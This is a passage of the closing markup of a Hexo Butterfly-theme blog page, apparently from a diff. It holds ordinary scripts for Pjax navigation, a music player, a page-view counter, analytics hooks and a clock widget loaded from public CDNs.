src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><div class="aplayer no-destroy" data-id="8552016907" data-server="tencent" data-type="playlist" data-fixed="true" data-autoplay="false"> </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  typeof preloader === 'object' && preloader.initLoading()
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+
+  typeof preloader === 'object' && preloader.endLoading()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script data-pjax>
+  function butterfly_clock_injector_config(){
+    var parent_div_git = document.getElementsByClassName('sticky_layout')[0];
+    var item_html = '<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src="https://npm.elemecdn.com/hexo-butterfly-clock/lib/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>';
+    console.log('已挂载butterfly_clock')
+    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  var elist = 'null'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_clock_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_clock_injector_config();
+  }
+  </script><script src="https://pv.sohu.com/cityjson?ie=utf-8"></script><script data-pjax src="https://npm.elemecdn.com/hexo-butterfly-clock/lib/clock.min.js"></script><!-- hexo injector body_end end --></body></html>
